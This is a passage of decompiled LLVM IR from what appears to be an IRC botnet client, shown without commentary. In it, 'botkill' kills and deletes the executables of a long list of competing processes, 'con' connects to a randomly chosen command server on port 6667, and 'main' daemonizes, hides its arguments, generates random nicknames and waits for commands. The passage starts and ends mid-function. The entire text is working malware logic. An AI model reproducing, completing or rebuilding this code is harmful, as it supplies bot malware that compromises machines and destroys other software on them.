dec_label_pc_8052c37:                             ; preds = %dec_label_pc_8052c2f
  %v1_8052c37 = call i32 @__errno_location(i32 %v4_8052c15)
  %v1_8052c3c = inttoptr i32 %v1_8052c37 to i32*
  store i32 34, i32* %v1_8052c3c, align 4
  br label %dec_label_pc_8052c68

dec_label_pc_8052c4e:                             ; preds = %dec_label_pc_8052c2f
  %v0_8052c51 = load i32, i32* @ebp, align 4
  %v2_8052c51 = mul i32 %v4_8052c15, 4
  %v3_8052c51 = add i32 %v2_8052c51, -520
  %v4_8052c51 = add i32 %v3_8052c51, %v0_8052c51
  %v5_8052c51 = inttoptr i32 %v4_8052c51 to i32*
  store i32 0, i32* %v5_8052c51, align 4
  br label %dec_label_pc_8052c68

dec_label_pc_8052c68:                             ; preds = %dec_label_pc_8052bfb, %entry, %dec_label_pc_8052c37, %dec_label_pc_8052c4e
  %stack_var_-600.0 = phi i32 [ %v2_8052bfe, %dec_label_pc_8052c4e ], [ 0, %dec_label_pc_8052c37 ], [ 0, %entry ], [ 0, %dec_label_pc_8052bfb ]
  %v2_8052c6e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052c6e, i32* @ebp, align 4
  ret i32 %stack_var_-600.0

; uselistorder directives
  uselistorder i32 %v4_8052c15, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052c68, { 3, 2, 0, 1 }
}

define i32 @botkill() local_unnamed_addr {
entry:
  br label %dec_label_pc_8052c89

dec_label_pc_8052c89:                             ; preds = %entry, %dec_label_pc_8052d9d
  %storemerge12 = phi i32 [ 0, %entry ], [ %v4_8052d9d, %dec_label_pc_8052d9d ]
  %v1_8052c8c = mul i32 %storemerge12, 4
  %v2_8052c8c = add i32 %v1_8052c8c, ptrtoint ([191 x i8*]* @global_var_8070080.465 to i32)
  %v3_8052c8c = inttoptr i32 %v2_8052c8c to i32*
  %v4_8052c8c = load i32, i32* %v3_8052c8c, align 4
  %v5_8052c93 = inttoptr i32 %v4_8052c8c to i8*
  %v6_8052c9e = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_806b38f.466, i32 0, i32 0), i8* %v5_8052c93)
  %v4_8052ca6 = load i32, i32* %v3_8052c8c, align 4
  %v2_8052cb0 = call i32 @proc_find(i32 %v4_8052ca6)
  %v13_8052cb8 = icmp eq i32 %v2_8052cb0, -1
  br i1 %v13_8052cb8, label %dec_label_pc_8052d9d, label %dec_label_pc_8052cc2

dec_label_pc_8052cc2:                             ; preds = %dec_label_pc_8052c89
  %v4_8052cc5 = load i32, i32* %v3_8052c8c, align 4
  %v5_8052cd3 = inttoptr i32 %v4_8052cc5 to i8*
  %v8_8052cde = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806b3a5.467, i32 0, i32 0), i8* %v5_8052cd3, i32 %v2_8052cb0)
  %v2_8052ce9 = call i32 @getexename(i32 %v2_8052cb0)
  %v4_8052cff = call i32 @kill(i32 %v2_8052cb0, i32 9)
  %v1_8052d04 = icmp eq i32 %v4_8052cff, 0
  %v1_8052d06 = icmp eq i1 %v1_8052d04, false
  br i1 %v1_8052d06, label %dec_label_pc_8052d13, label %dec_label_pc_8052d08

dec_label_pc_8052d08:                             ; preds = %dec_label_pc_8052cc2
  %v0_8052d08 = load i8*, i8** @global_var_8075060.468, align 4
  %v1_8052d08 = ptrtoint i8* %v0_8052d08 to i32
  %v1_8052d0d = add i32 %v1_8052d08, 1
  %v1_8052d0e = inttoptr i32 %v1_8052d0d to i8*
  store i8* %v1_8052d0e, i8** @global_var_8075060.468, align 32
  br label %dec_label_pc_8052d13

dec_label_pc_8052d13:                             ; preds = %dec_label_pc_8052cc2, %dec_label_pc_8052d08
  %v4_8052d13 = icmp eq i32 %v2_8052ce9, 0
  %v4_8052d86 = load i32, i32* %v3_8052c8c, align 4
  br i1 %v4_8052d13, label %dec_label_pc_8052d83, label %dec_label_pc_8052d19

dec_label_pc_8052d19:                             ; preds = %dec_label_pc_8052d13
  %v5_8052d26 = inttoptr i32 %v2_8052ce9 to i8*
  %v5_8052d2a = inttoptr i32 %v4_8052d86 to i8*
  %v9_8052d35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_806b3c0.469, i32 0, i32 0), i8* %v5_8052d2a, i8* %v5_8052d26)
  %v2_8052d40 = call i32 @remove(i32 %v2_8052ce9)
  %v4_8052d48 = icmp eq i32 %v2_8052d40, 0
  %v1_8052d4c = icmp eq i1 %v4_8052d48, false
  br i1 %v1_8052d4c, label %dec_label_pc_8052d6e, label %dec_label_pc_8052d4e

dec_label_pc_8052d4e:                             ; preds = %dec_label_pc_8052d19
  %v6_8052d5c = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @global_var_806b3e0.470, i32 0, i32 0), i8* %v5_8052d26)
  %v0_8052d61 = load i8*, i8** @global_var_8075064.471, align 4
  %v1_8052d61 = ptrtoint i8* %v0_8052d61 to i32
  %v1_8052d66 = add i32 %v1_8052d61, 1
  %v1_8052d67 = inttoptr i32 %v1_8052d66 to i8*
  store i8* %v1_8052d67, i8** @global_var_8075064.471, align 4
  br label %dec_label_pc_8052d9d

dec_label_pc_8052d6e:                             ; preds = %dec_label_pc_8052d19
  %v6_8052d7c = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_806b3ff.472, i32 0, i32 0), i8* %v5_8052d26)
  br label %dec_label_pc_8052d9d

dec_label_pc_8052d83:                             ; preds = %dec_label_pc_8052d13
  %v5_8052d8d = inttoptr i32 %v4_8052d86 to i8*
  %v6_8052d98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_806b41c.473, i32 0, i32 0), i8* %v5_8052d8d)
  br label %dec_label_pc_8052d9d

dec_label_pc_8052d9d:                             ; preds = %dec_label_pc_8052c89, %dec_label_pc_8052d6e, %dec_label_pc_8052d4e, %dec_label_pc_8052d83
  %v4_8052d9d = add i32 %storemerge12, 1
  %tmp = icmp ult i32 %v4_8052d9d, 191
  br i1 %tmp, label %dec_label_pc_8052c89, label %dec_label_pc_8052dae

dec_label_pc_8052dae:                             ; preds = %dec_label_pc_8052d9d
  %v0_8052dae = load i8*, i8** @global_var_8075064.471, align 4
  %v1_8052dae = ptrtoint i8* %v0_8052dae to i32
  %v0_8052db3 = load i8*, i8** @global_var_8075060.468, align 4
  %v1_8052db3 = ptrtoint i8* %v0_8052db3 to i32
  %v7_8052dc8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @global_var_806b468.474, i32 0, i32 0), i32 %v1_8052db3, i32 %v1_8052dae)
  ret i32 %v7_8052dc8

; uselistorder directives
  uselistorder i32 %v4_8052d86, { 1, 0 }
  uselistorder i32 %v2_8052cb0, { 1, 3, 2, 0 }
  uselistorder i8** @global_var_8075064.471, { 2, 1, 0 }
  uselistorder i8** @global_var_8075060.468, { 2, 1, 0 }
  uselistorder i32 (i8*, ...)* @printf, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052d9d, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052d13, { 1, 0 }
  uselistorder label %dec_label_pc_8052c89, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055b6c = load i32, i32* @ebp, align 4
  store i32 %v0_8055b6c, i32* %stack_var_-4, align 4
  %v4_8055b6c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8055b6c, i32* @ebp, align 4
  %v2_8055c42 = ptrtoint i32* %stack_var_-32 to i32
  %v2_8055c45 = ptrtoint i32* %stack_var_-28 to i32
  %v2_8055c91 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_8055b74

dec_label_pc_8055b74:                             ; preds = %dec_label_pc_8055b74.backedge, %entry
  store i32 -1, i32* @global_var_807db70.29, align 16
  store i32 1, i32* %stack_var_-36, align 4
  %v0_8055b85 = load i32, i32* @global_var_807506c.494, align 4
  %v1_8055b8a = icmp eq i32 %v0_8055b85, 0
  %v1_8055b8c = icmp eq i1 %v1_8055b8a, false
  br i1 %v1_8055b8c, label %dec_label_pc_8055bb1, label %dec_label_pc_8055b8e

dec_label_pc_8055b8e:                             ; preds = %dec_label_pc_8055b74
  %v1_8055b8e = call i32 @random()
  %v0_8055b95 = load i64, i64* @global_var_8070060.594, align 8
  %sext = mul i64 %v0_8055b95, 4294967296
  %v5_8055b9a = sdiv i64 %sext, 4294967296
  %v1_8055b9f = ashr i32 %v1_8055b8e, 31
  %v6_8055ba0 = zext i32 %v1_8055b8e to i64
  %v8_8055ba0 = zext i32 %v1_8055b9f to i64
  %v9_8055ba0 = mul nuw i64 %v8_8055ba0, 4294967296
  %v10_8055ba0 = or i64 %v9_8055ba0, %v6_8055ba0
  %v14_8055ba0 = srem i64 %v10_8055ba0, %v5_8055b9a
  %v15_8055ba0 = trunc i64 %v14_8055ba0 to i32
  %v1_8055ba5 = mul i32 %v15_8055ba0, 4
  %v2_8055ba5 = add i32 %v1_8055ba5, ptrtoint ([16 x i8]** @global_var_8070064.596 to i32)
  %v3_8055ba5 = inttoptr i32 %v2_8055ba5 to i32*
  %v4_8055ba5 = load i32, i32* %v3_8055ba5, align 4
  store i32 %v4_8055ba5, i32* @global_var_807dc84.493, align 4
  br label %dec_label_pc_8055bb1

dec_label_pc_8055bb1:                             ; preds = %dec_label_pc_8055b74, %dec_label_pc_8055b8e
  store i32 0, i32* @global_var_807506c.494, align 4
  br label %dec_label_pc_8055bbb

dec_label_pc_8055bbb:                             ; preds = %dec_label_pc_8055bbb, %dec_label_pc_8055bb1
  store i32 2, i32* %stack_var_-60, align 4
  %v3_8055bd2 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_8055bd2, i32* @global_var_807db70.29, align 16
  %v2_8055be1 = icmp slt i32 %v3_8055bd2, 0
  br i1 %v2_8055be1, label %dec_label_pc_8055bbb, label %dec_label_pc_8055be5

dec_label_pc_8055be5:                             ; preds = %dec_label_pc_8055bbb
  %v0_8055be5 = load i32, i32* @global_var_807dc84.493, align 4
  store i32 %v0_8055be5, i32* %stack_var_-60, align 4
  %v1_8055bed = call i32 @inet_addr(i32 %v0_8055be5)
  %v1_8055bf2 = icmp eq i32 %v1_8055bed, 0
  br i1 %v1_8055bf2, label %dec_label_pc_8055c08, label %dec_label_pc_8055bf6

dec_label_pc_8055bf6:                             ; preds = %dec_label_pc_8055be5
  %v0_8055bf6 = load i32, i32* @global_var_807dc84.493, align 4
  store i32 %v0_8055bf6, i32* %stack_var_-60, align 4
  %v1_8055bfe = call i32 @inet_addr(i32 %v0_8055bf6)
  %v10_8055c03 = icmp eq i32 %v1_8055bfe, -1
  %v1_8055c06 = icmp eq i1 %v10_8055c03, false
  br i1 %v1_8055c06, label %dec_label_pc_8055c62, label %dec_label_pc_8055c08

dec_label_pc_8055c08:                             ; preds = %dec_label_pc_8055bf6, %dec_label_pc_8055be5
  %v0_8055c08 = load i32, i32* @global_var_807dc84.493, align 4
  store i32 %v0_8055c08, i32* %stack_var_-60, align 4
  %v1_8055c10 = call i32 @__GI_gethostbyname(i32 %v0_8055c08)
  %v4_8055c18 = icmp eq i32 %v1_8055c10, 0
  %v1_8055c1c = icmp eq i1 %v4_8055c18, false
  br i1 %v1_8055c1c, label %dec_label_pc_8055c3a, label %dec_label_pc_8055c1e

dec_label_pc_8055c1e:                             ; preds = %dec_label_pc_8055c08
  store i32 0, i32* @global_var_807dc84.493, align 4
  %v0_8055c28 = load i32, i32* @global_var_807db70.29, align 16
  store i32 %v0_8055c28, i32* %stack_var_-60, align 4
  %v1_8055c30 = call i32 @close(i32 %v0_8055c28)
  br label %dec_label_pc_8055b74.backedge

dec_label_pc_8055b74.backedge:                    ; preds = %dec_label_pc_8055c1e, %dec_label_pc_8055dbd
  br label %dec_label_pc_8055b74

dec_label_pc_8055c3a:                             ; preds = %dec_label_pc_8055c08
  %v1_8055c3d = add i32 %v1_8055c10, 12
  %v2_8055c3d = inttoptr i32 %v1_8055c3d to i32*
  %v3_8055c3d = load i32, i32* %v2_8055c3d, align 4
  %v1_8055c4b = add i32 %v1_8055c10, 16
  %v2_8055c4b = inttoptr i32 %v1_8055c4b to i32*
  %v3_8055c4b = load i32, i32* %v2_8055c4b, align 4
  %v1_8055c4e = inttoptr i32 %v3_8055c4b to i32*
  %v2_8055c4e = load i32, i32* %v1_8055c4e, align 4
  store i32 %v2_8055c4e, i32* %stack_var_-60, align 4
  %v3_8055c5b = call i32 @bcopy(i32 %v2_8055c4e, i32 %v2_8055c45, i32 %v3_8055c3d)
  br label %dec_label_pc_8055c72

dec_label_pc_8055c62:                             ; preds = %dec_label_pc_8055bf6
  %v0_8055c62 = load i32, i32* @global_var_807dc84.493, align 4
  store i32 %v0_8055c62, i32* %stack_var_-60, align 4
  %v1_8055c6a = call i32 @inet_addr(i32 %v0_8055c62)
  store i32 %v1_8055c6a, i32* %stack_var_-28, align 4
  br label %dec_label_pc_8055c72

dec_label_pc_8055c72:                             ; preds = %dec_label_pc_8055c3a, %dec_label_pc_8055c62
  store i32 2, i32* %stack_var_-32, align 4
  store i32 6667, i32* %stack_var_-60, align 4
  %v2_8055c7f = call i32 @htons(i16 6667)
  %v0_8055c8b = load i32, i32* @global_var_807db70.29, align 16
  store i32 %v0_8055c8b, i32* %stack_var_-60, align 4
  %v3_8055ca3 = call i32 @ioctl(i32 %v0_8055c8b, i32 21537, i32 %v2_8055c91)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_8055caf = call i32 @__GI_time(i32* null)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_8055dac16 = call i32 @__GI_time(i32* null)
  %v5_8055db117 = sub i32 %v2_8055dac16, %v2_8055caf
  %tmp = icmp ult i32 %v5_8055db117, 10
  br i1 %tmp, label %dec_label_pc_8055cbc, label %dec_label_pc_8055dbd

dec_label_pc_8055cbc:                             ; preds = %dec_label_pc_8055c72, %dec_label_pc_8055d99
  %v1_8055cbc = call i32 @__errno_location(i32 %v2_8055caf)
  %v1_8055cc1 = inttoptr i32 %v1_8055cbc to i32*
  store i32 0, i32* %v1_8055cc1, align 4
  %v0_8055cca = load i32, i32* @global_var_807db70.29, align 16
  store i32 %v0_8055cca, i32* %stack_var_-60, align 4
  %v3_8055cdf = call i32 @connect(i32 %v0_8055cca, i32 %v2_8055c42, i32 16)
  %v1_8055ce4 = icmp eq i32 %v3_8055cdf, 0
  br i1 %v1_8055ce4, label %dec_label_pc_8055cf8, label %dec_label_pc_8055ce8

dec_label_pc_8055ce8:                             ; preds = %dec_label_pc_8055cbc
  %v0_8055ce8 = load i32, i32* %stack_var_-60, align 4
  %v1_8055ce8 = call i32 @__errno_location(i32 %v0_8055ce8)
  %v1_8055ced = inttoptr i32 %v1_8055ce8 to i32*
  %v2_8055ced = load i32, i32* %v1_8055ced, align 4
  %v9_8055cef = icmp eq i32 %v2_8055ced, 106
  %v1_8055cf2 = icmp eq i1 %v9_8055cef, false
  br i1 %v1_8055cf2, label %dec_label_pc_8055d81, label %dec_label_pc_8055cf8

dec_label_pc_8055cf8:                             ; preds = %dec_label_pc_8055ce8, %dec_label_pc_8055cbc
  %v0_8055cf8 = load i32, i32* @global_var_807db70.29, align 16
  store i32 %v0_8055cf8, i32* %stack_var_-60, align 4
  %v5_8055d20 = call i32 @__GI_setsockopt(i32 %v0_8055cf8, i32 1, i32 13, i32 0, i32 0)
  %v0_8055d25 = load i32, i32* @global_var_807db70.29, align 16
  store i32 %v0_8055d25, i32* %stack_var_-60, align 4
  %v5_8055d4d = call i32 @__GI_setsockopt(i32 %v0_8055d25, i32 1, i32 2, i32 0, i32 0)
  %v0_8055d52 = load i32, i32* @global_var_807db70.29, align 16
  store i32 %v0_8055d52, i32* %stack_var_-60, align 4
  %v5_8055d7a = call i32 @__GI_setsockopt(i32 %v0_8055d52, i32 1, i32 9, i32 0, i32 0)
  %v2_8055dd9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055dd9, i32* @ebp, align 4
  ret i32 %v5_8055d7a

dec_label_pc_8055d81:                             ; preds = %dec_label_pc_8055ce8
  %v0_8055d81 = load i32, i32* %stack_var_-60, align 4
  %v1_8055d81 = call i32 @__errno_location(i32 %v0_8055d81)
  %v1_8055d86 = inttoptr i32 %v1_8055d81 to i32*
  %v2_8055d86 = load i32, i32* %v1_8055d86, align 4
  %v9_8055d88 = icmp eq i32 %v2_8055d86, 115
  br i1 %v9_8055d88, label %dec_label_pc_8055d99, label %dec_label_pc_8055d8d

dec_label_pc_8055d8d:                             ; preds = %dec_label_pc_8055d81
  %v0_8055d8d = load i32, i32* %stack_var_-60, align 4
  %v1_8055d8d = call i32 @__errno_location(i32 %v0_8055d8d)
  %v1_8055d92 = inttoptr i32 %v1_8055d8d to i32*
  %v2_8055d92 = load i32, i32* %v1_8055d92, align 4
  %v9_8055d94 = icmp eq i32 %v2_8055d92, 114
  %v1_8055d97 = icmp eq i1 %v9_8055d94, false
  br i1 %v1_8055d97, label %dec_label_pc_8055dbd, label %dec_label_pc_8055d99

dec_label_pc_8055d99:                             ; preds = %dec_label_pc_8055d8d, %dec_label_pc_8055d81
  store i32 1, i32* %stack_var_-60, align 4
  %v1_8055da0 = call i32 @sleep(i32 1)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_8055dac = call i32 @__GI_time(i32* null)
  %v5_8055db1 = sub i32 %v2_8055dac, %v2_8055caf
  %tmp23 = icmp ult i32 %v5_8055db1, 10
  br i1 %tmp23, label %dec_label_pc_8055cbc, label %dec_label_pc_8055dbd

dec_label_pc_8055dbd:                             ; preds = %dec_label_pc_8055d99, %dec_label_pc_8055d8d, %dec_label_pc_8055c72
  store i32 0, i32* @global_var_807dc84.493, align 4
  %v0_8055dc7 = load i32, i32* @global_var_807db70.29, align 16
  store i32 %v0_8055dc7, i32* %stack_var_-60, align 4
  %v1_8055dcf = call i32 @close(i32 %v0_8055dc7)
  br label %dec_label_pc_8055b74.backedge

; uselistorder directives
  uselistorder i32 %v2_8055caf, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 4, 5, 6, 1, 2, 7, 8, 9, 3, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 ()* @random, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8055c72, { 1, 0 }
  uselistorder label %dec_label_pc_8055b74.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8055bb1, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-1484 = alloca i32, align 4
  %stack_var_-2508 = alloca i32, align 4
  %stack_var_-6604 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-6672 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8055ddb = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8055ddb, i32* @ecx, align 4
  store i32 ptrtoint ([73 x i8]* @global_var_806d52c.597 to i32), i32* %stack_var_-6672, align 4
  %v1_8055dff = call i32 @puts(i32 ptrtoint ([73 x i8]* @global_var_806d52c.597 to i32))
  store i32 ptrtoint ([68 x i8]* @global_var_806d578.598 to i32), i32* %stack_var_-6672, align 4
  %v1_8055e0b = call i32 @puts(i32 ptrtoint ([68 x i8]* @global_var_806d578.598 to i32))
  store i32 ptrtoint ([130 x i8]* @global_var_806d5bc.599 to i32), i32* %stack_var_-6672, align 4
  %v1_8055e17 = call i32 @puts(i32 ptrtoint ([130 x i8]* @global_var_806d5bc.599 to i32))
  %v0_8055e1c = call i32 @botkill()
  store i32 1701603661, i32* @global_var_807da60.63, align 32
  store i32 1232038766, i32* @global_var_807da64.600, align 4
  store i32 1970231667, i32* @global_var_807da68.601, align 8
  store i32 1685014386, i32* @global_var_807da6c.602, align 4
  store i32 2171169, i32* @global_var_807da70.603, align 16
  %v0_8055e53 = load i32, i32* %stack_var_-6672, align 4
  %v1_8055e53 = call i32 @fork(i32 %v0_8055e53)
  %v1_8055e58 = icmp eq i32 %v1_8055e53, 0
  br i1 %v1_8055e58, label %dec_label_pc_8055e68, label %dec_label_pc_8055e5c

dec_label_pc_8055e5c:                             ; preds = %entry
  store i32 0, i32* %stack_var_-6672, align 4
  %v1_8055e63 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8055e68

dec_label_pc_8055e68:                             ; preds = %entry, %dec_label_pc_8055e5c
  %v1_8055e6e = add i32 %v2_8055ddb, 4
  %v2_8055e6e = inttoptr i32 %v1_8055e6e to i32*
  %v3_8055e6e = load i32, i32* %v2_8055e6e, align 4
  %v1_8055e71 = inttoptr i32 %v3_8055e6e to i32*
  %v2_8055e71 = load i32, i32* %v1_8055e71, align 4
  store i1 false, i1* @df, align 1
  %v4_8055e81 = inttoptr i32 %v2_8055e71 to i8*
  %v3_8055e87 = call i32 @_strlen(i8* %v4_8055e81)
  %v3_8055e96 = load i32, i32* %v2_8055e6e, align 4
  %v1_8055e99 = inttoptr i32 %v3_8055e96 to i32*
  %v2_8055e99 = load i32, i32* %v1_8055e99, align 4
  store i32 %v2_8055e99, i32* %stack_var_-6672, align 4
  %v4_8055eaa = inttoptr i32 %v2_8055e99 to i8*
  %v5_8055eaa = call i32 @strncpy(i8* %v4_8055eaa, i32 ptrtoint ([3 x i8]* @global_var_806d63e.604 to i32), i32 %v3_8055e87)
  store i32 %v2_8055ddb, i32* @edi, align 4
  %v3_8055f17111 = load i32, i32* %stack_var_4, align 4
  %v5_8055f19115 = icmp sgt i32 %v3_8055f17111, 1
  br i1 %v5_8055f19115, label %dec_label_pc_8055eb8, label %dec_label_pc_8055f1b

dec_label_pc_8055eb8:                             ; preds = %dec_label_pc_8055e68, %dec_label_pc_8055eb8
  %storemerge12116 = phi i32 [ %v4_8055f0b, %dec_label_pc_8055eb8 ], [ 1, %dec_label_pc_8055e68 ]
  %v2_8055ebb = mul i32 %storemerge12116, 4
  %v4_8055ec4 = load i32, i32* %v2_8055e6e, align 4
  %v5_8055ec4 = add i32 %v4_8055ec4, %v2_8055ebb
  %v1_8055ec7 = inttoptr i32 %v5_8055ec4 to i32*
  %v2_8055ec7 = load i32, i32* %v1_8055ec7, align 4
  store i1 false, i1* @df, align 1
  %v4_8055ed7 = inttoptr i32 %v2_8055ec7 to i8*
  store i32 %v2_8055ec7, i32* @edi, align 4
  %v3_8055edd = call i32 @_strlen(i8* %v4_8055ed7)
  %v4_8055ef2 = load i32, i32* %v2_8055e6e, align 4
  %v5_8055ef2 = add i32 %v4_8055ef2, %v2_8055ebb
  %v1_8055ef5 = inttoptr i32 %v5_8055ef2 to i32*
  %v2_8055ef5 = load i32, i32* %v1_8055ef5, align 4
  store i32 %v2_8055ef5, i32* %stack_var_-6672, align 4
  %v4_8055f06 = inttoptr i32 %v2_8055ef5 to i8*
  %v5_8055f06 = call i32 @__GI_memset(i8* %v4_8055f06, i32 0, i32 %v3_8055edd)
  %v4_8055f0b = add i32 %storemerge12116, 1
  store i32 %v2_8055ddb, i32* @edi, align 4
  %v3_8055f17 = load i32, i32* %stack_var_4, align 4
  %v5_8055f19 = icmp slt i32 %v4_8055f0b, %v3_8055f17
  br i1 %v5_8055f19, label %dec_label_pc_8055eb8, label %dec_label_pc_8055f1b

dec_label_pc_8055f1b:                             ; preds = %dec_label_pc_8055eb8, %dec_label_pc_8055e68
  store i32 0, i32* %stack_var_-6672, align 4
  %v2_8055f22 = call i32 @__GI_time(i32* null)
  store i32 %v2_8055f22, i32* @ebx, align 4
  %v0_8055f29 = load i32, i32* %stack_var_-6672, align 4
  %v1_8055f29 = call i32 @__libc_getpid(i32 %v0_8055f29)
  %v0_8055f2e = load i32, i32* @ebx, align 4
  %v2_8055f2e = xor i32 %v0_8055f2e, %v1_8055f29
  store i32 %v2_8055f2e, i32* @ebx, align 4
  %v0_8055f30 = load i32, i32* %stack_var_-6672, align 4
  %v1_8055f30 = call i32 @getppid(i32 %v0_8055f30)
  %v0_8055f35 = load i32, i32* @ebx, align 4
  %v2_8055f35 = add i32 %v0_8055f35, %v1_8055f30
  store i32 %v2_8055f35, i32* %stack_var_-6672, align 4
  %v1_8055f3b = call i32 @srand(i32 %v2_8055f35)
  store i32 4, i32* %stack_var_-6672, align 4
  %v3_8055f4f = call i32 @realrand(i32 4, i32 8)
  store i32 %v3_8055f4f, i32* %stack_var_-6672, align 4
  %v1_8055f57 = inttoptr i32 %v3_8055f4f to i8*
  %v2_8055f57 = call i32 @randstring(i8* %v1_8055f57)
  store i32 %v2_8055f57, i32* @global_var_807db6c.53, align 4
  store i32 4, i32* %stack_var_-6672, align 4
  %v3_8055f70 = call i32 @realrand(i32 4, i32 8)
  store i32 %v3_8055f70, i32* %stack_var_-6672, align 4
  %v1_8055f78 = inttoptr i32 %v3_8055f70 to i8*
  %v2_8055f78 = call i32 @randstring(i8* %v1_8055f78)
  store i32 %v2_8055f78, i32* @global_var_807db64.36, align 4
  store i32 4, i32* %stack_var_-6672, align 4
  %v3_8055f91 = call i32 @realrand(i32 4, i32 8)
  store i32 %v3_8055f91, i32* %stack_var_-6672, align 4
  %v1_8055f99 = inttoptr i32 %v3_8055f91 to i8*
  %v2_8055f99 = call i32 @randstring(i8* %v1_8055f99)
  store i32 %v2_8055f99, i32* @global_var_807db7c.605, align 4
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806b06b.246, i32 0, i32 0), i8** @global_var_807f0f8.262, align 8
  store i32 ptrtoint ([8 x i8]* @global_var_806d641.606 to i32), i32* @global_var_807f0dc.586, align 4
  store i32 0, i32* @global_var_807dc84.493, align 4
  %v2_8056019 = ptrtoint i32* %stack_var_-460 to i32
  %tmp76 = bitcast i32* %stack_var_-460 to i8*
  %v4_8056064 = ptrtoint i32* %stack_var_-332 to i32
  %v2_80561dc = ptrtoint i32* %stack_var_-6604 to i32
  %v2_80562ae = ptrtoint i32* %stack_var_-2508 to i32
  %v2_8056307 = ptrtoint i32* %stack_var_-1484 to i32
  %v3_8056310 = bitcast i32* %stack_var_-1484 to i8*
  %tmp77 = bitcast i8** %stack_var_-32 to i32*
  %tmp78 = bitcast i32* %stack_var_-2508 to i8*
  br label %dec_label_pc_8055fc3

dec_label_pc_8055fc3:                             ; preds = %dec_label_pc_80563b2, %dec_label_pc_80563a5, %dec_label_pc_80563cf, %dec_label_pc_80561c7, %dec_label_pc_805600f, %dec_label_pc_8055f1b
  %v0_8055fc3 = call i32 @con()
  %v0_8055fc8 = load i32, i32* @global_var_807db64.36, align 4
  store i32 %v0_8055fc8, i32* @ebx, align 4
  %v0_8055fce = load i32, i32* @global_var_807db7c.605, align 4
  store i32 %v0_8055fce, i32* @esi, align 4
  %v0_8055fd4 = load i32, i32* @global_var_807db6c.53, align 4
  store i32 %v0_8055fd4, i32* @edi, align 4
  %v0_8055fda = call i32 @getBuild()
  %v0_8055fdf = load i32, i32* @global_var_807db70.29, align 16
  store i32 %v0_8055fdf, i32* %stack_var_-6672, align 4
  %v3_8056008 = call i32 @Send(i32 %v0_8055fdf, i32 ptrtoint ([48 x i8]* @global_var_806d64c.607 to i32))
  br label %dec_label_pc_805600f

dec_label_pc_805600f:                             ; preds = %dec_label_pc_80561a2, %dec_label_pc_80561fb, %dec_label_pc_80563de, %dec_label_pc_80563ff, %dec_label_pc_8055fc3
  store i32 %v2_8056019, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8056020 = call i8* @_memset(i8* %tmp76, i32 0, i32 32)
  %v0_8056028 = load i32, i32* @global_var_807db70.29, align 16
  %v2_805602f = udiv i32 %v0_8056028, 32
  %v1_8056037 = urem i32 %v0_8056028, 32
  %v0_805603a = load i32, i32* @ebp, align 4
  %v2_805603a = mul nuw nsw i32 %v2_805602f, 4
  %v3_805603a = add nsw i32 %v2_805603a, -452
  %v4_805603a = add i32 %v3_805603a, %v0_805603a
  %v5_805603a = inttoptr i32 %v4_805603a to i32*
  %v6_805603a = load i32, i32* %v5_805603a, align 4
  %v9_805603a = shl i32 1, %v1_8056037
  %v12_805603a = or i32 %v6_805603a, %v9_805603a
  store i32 %v12_805603a, i32* %v5_805603a, align 4
  store i32 1200, i32* %stack_var_-332, align 4
  %v0_8056056 = load i32, i32* @global_var_807db70.29, align 16
  %v1_805605b = add i32 %v0_8056056, 1
  store i32 %v1_805605b, i32* %stack_var_-6672, align 4
  %v6_8056085 = call i32 @__libc_select(i32 %v1_805605b, i32 %v2_8056019, i32 0, i32 0, i32 %v4_8056064)
  %tmp79 = icmp slt i32 %v6_8056085, 1
  br i1 %tmp79, label %dec_label_pc_8055fc3, label %dec_label_pc_8056194.preheader

dec_label_pc_8056194.preheader:                   ; preds = %dec_label_pc_805600f
  %v0_805619498 = load i32, i32* @global_var_807507c.31, align 4
  %v10_8056199100 = icmp eq i32 %v0_805619498, 0
  br i1 %v10_8056199100, label %dec_label_pc_80561a2, label %dec_label_pc_805609e

dec_label_pc_805609e:                             ; preds = %dec_label_pc_8056194.preheader, %dec_label_pc_8056191
  %storemerge9103 = phi i32 [ %.pre, %dec_label_pc_8056191 ], [ 0, %dec_label_pc_8056194.preheader ]
